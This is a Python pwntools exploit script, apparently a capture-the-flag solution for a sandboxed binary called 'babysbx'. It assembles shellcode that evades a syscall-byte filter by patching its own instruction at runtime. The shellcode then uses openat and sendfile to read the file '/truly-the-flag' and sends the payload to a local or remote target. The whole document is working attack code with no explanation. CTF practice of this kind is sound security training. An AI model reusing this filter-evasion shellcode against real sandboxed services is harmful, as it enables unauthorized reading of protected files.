#!/usr/bin/env python3

from pwn import *
context.terminal = ["tmux", "splitw", "-h"]

exe = "./babysbx"
elf = context.binary = ELF(exe)
io = remote(sys.argv[1], int(sys.argv[2])) if args.REMOTE else process()
if args.GDB: gdb.attach(io, "b *main+212")

# instruction to build `syscall` at runtime:
syscall = """
	inc BYTE PTR [rip]
	.word 0x050e
"""

sc = asm(f"""

	/* load /truly-the-flag into rsi */
	or rbx, flag[rip]
	or rcx, flag+8[rip]
	push rcx
	push rbx
	lea rsi, [rsp]

	/* openat */
	xor rax, rax
	add rax, 0x101
	{syscall}

	/* sendfile */
	push 0x01
	pop rdi
	push rax
	pop rsi
	add r10, 0x1000
	xor rax, rax
	add rax, 0x28
	{syscall}

flag:
	.string "/truly-the-flag"
""")

io.sendafter(b"shellcode: ", sc)
io.interactive()
